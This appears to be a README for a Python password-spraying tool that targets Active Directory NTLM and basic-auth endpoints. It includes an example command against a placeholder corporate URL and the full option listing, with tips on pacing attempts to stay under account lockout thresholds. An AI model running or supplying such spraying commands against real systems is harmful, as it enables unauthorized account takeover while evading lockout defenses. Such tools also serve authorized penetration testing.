# 401_spray

This is a simple password sprayer to hit AD-connected NTLM endpoints. It is designed with a lockout policy in mind. 

For example, say lockout policy is 5 attempts in 30 minutes. You could use a command like:

```
./401_spray.py -u list_of_usernames.txt -p list_of_passwords.txt -d acmecorp.intl -U https://totslegit.acme.com/admin/ntlmauth -a 3 -i 40 --authtype ntlm --threads 10
```

This will spray the list, and try three passwords, then sleep for 40 minutes.

```
usage: 401_spray.py [-h] -u USERNAMES -p PASSWORDS [-d DOMAIN] -U URL [-a ATTEMPTS] [-i INTERVAL]
                    [--authtype {ntlm,basic}] [--proxy PROXY] [--threads THREADS] [--output OUTPUT]
                    [--add_response]

options:
  -h, --help            show this help message and exit
  -u USERNAMES, --usernames USERNAMES
                        List of usernames to attack
  -p PASSWORDS, --passwords PASSWORDS
                        List of passwords to try
  -d DOMAIN, --domain DOMAIN
                        Domain name to append. If not included, then domains will be assumed to be in
                        username list.
  -U URL, --url URL     URL to authenticate against
  -a ATTEMPTS, --attempts ATTEMPTS
                        Number of attempts to try before sleeping. If your lockout policy is 5 attempts
                        per 10 minutes, then set this to like 3
  -i INTERVAL, --interval INTERVAL
                        Number of minutes to sleep between attacks. If your lockout policy is per 10
                        minutes, set this to like 11
  --authtype {ntlm,basic}
                        Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM
  --proxy PROXY         Proxy server to route traffic through
  --threads THREADS     Number of threads
  --output OUTPUT       File to write successful pairs to
  --add_response        Add response times to output

```